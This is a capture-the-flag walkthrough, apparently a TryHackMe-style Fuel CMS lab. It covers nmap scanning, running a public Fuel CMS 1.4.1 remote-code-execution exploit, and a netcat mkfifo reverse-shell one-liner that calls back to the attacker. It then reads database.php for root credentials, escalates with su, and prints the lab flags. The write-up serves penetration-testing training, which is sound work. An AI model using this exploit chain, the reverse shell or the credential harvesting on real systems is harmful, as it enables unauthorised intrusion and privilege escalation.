Scan for the avaiable ports
Command 
nmap 10.49.146.239 -sC

Explanation 
-sC will provide the default script scan and give the open port information 

Result 
80/tcp open  http
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-title: Welcome to FUEL CMS

As we have active services on port 80, let check if we can access the website <http://Target IP>

Once the page has been loaded we can see the app anem and its version. Now lets check, if there is any information avaiable on explaoit DB 

Results 
Date	D	A	V	Title	Type	Platform	Author

2019-07-19				fuel CMS 1.4.1 - Remote Code Execution (1)	WebApps	Linux	0xd0ff9

As the version is 1.4, lets consider the Remote code execution vulnerability and Fuel CMS 1.4.1 - Remote Code Execution (3). 
Now download the exploit file which is 50477.py. 

As per the details on exploit file, we see that the file is of python3. 
Command 
python3 <pythonfile> -u http://<Target IP>

Make sure to be on the directory where the python file is saved. 
Once the python file has been run, you will able to get the remote access. 

Now, let get the reverse shell connection by using netcat and reverse shell code from Google. 
Reverse shell command - $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Your machine IP> <Port on which you want the connaction>>/tmp/f
This code was got from - https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet >> Netcat

On new terminal use the command 
nc -lvnp portno 
nc - netcat - a tool that opens raw network connections and sends/receives data
-lvnp - listen, numeric, verbose, port 

In hacking, it’s commonly used to:
listen for reverse shells
connect to other machine
move data between systems

Once we get the netcat connection we need to use the command to get the interactive session 
command 
python3 -c 'import pty; pty.spawn("/bin/bash")'
It upgrades your dumb shell into an interactive TTY shell.

When you perform whoami, the results shows as www-data
now, perform ls and check for the usertxt in home directory. 

ls 
cd /home/www-data
cat flag.txt 

Result 
6470e394cbf6dab6a91682cc8585059b

Now, lets check for the root privilege
Any web application must store database credentials somewhere. so let check for cat fuel/application/config/database.php
Fuel CMS is written in PHP, and PHP apps usually store config in:
.php config files
inside a config/ directory

Fuel CMS follow this structure 
fuel/
 └── application/
     └── config/
         └── database.php
From the file, we can see the username and password 
username =root, password = mememe

Now, use su 
it will ask for password. Provide password as mememe

check for whoami, it will show the details as root. 

Now got cd /root and check for the files. 

we have root.txt 
cat root.txt 

Result 
b9bbcb33e11b80be759c4e844862482d
